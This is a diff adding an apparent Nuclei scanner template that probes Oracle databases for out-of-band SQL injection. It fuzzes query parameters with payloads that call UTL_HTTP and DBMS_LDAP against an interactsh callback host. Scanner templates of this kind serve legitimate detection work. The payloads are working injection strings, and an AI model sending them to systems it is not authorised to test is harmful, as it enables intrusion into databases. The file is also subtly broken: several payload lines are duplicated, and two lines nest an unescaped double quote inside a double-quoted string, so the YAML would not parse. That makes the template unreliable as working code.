@@ -1,0 +1,36 @@
+id: fuzz-oracle-oob
+
+info:
+  name: Oracle OOB via UTL_HTTP and DBMS_LDAP
+  author: openai
+  severity: high
+  tags: oracle,oob,dast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      oracle_oob:
+        - "1; SELECT UTL_HTTP.REQUEST('http://{{interactsh-url}}/oracle') FROM DUAL--"
+        - "1; BEGIN DBMS_LDAP.INIT('ldap.{{interactsh-url}}', 80); END;--"
+        - "1'; SELECT UTL_HTTP.REQUEST('http://{{interactsh-url}}/oracle') FROM DUAL--"
+        - "1"; BEGIN DBMS_LDAP.INIT('ldap.{{interactsh-url}}', 80); END;--"
+        - "1'; SELECT UTL_HTTP.REQUEST('http://{{interactsh-url}}/oracle') FROM DUAL--"
+        - "1"; BEGIN DBMS_LDAP.INIT('ldap.{{interactsh-url}}', 80); END;--"
+        - "1 SELECT UTL_HTTP.REQUEST('http://{{interactsh-url}}/oracle') FROM DUAL--"
+        - "1 BEGIN DBMS_LDAP.INIT('ldap.{{interactsh-url}}', 80); END;--"
+
+    fuzzing:
+      - part: query
+        mode: single
+        fuzz:
+          - "{{oracle_oob}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
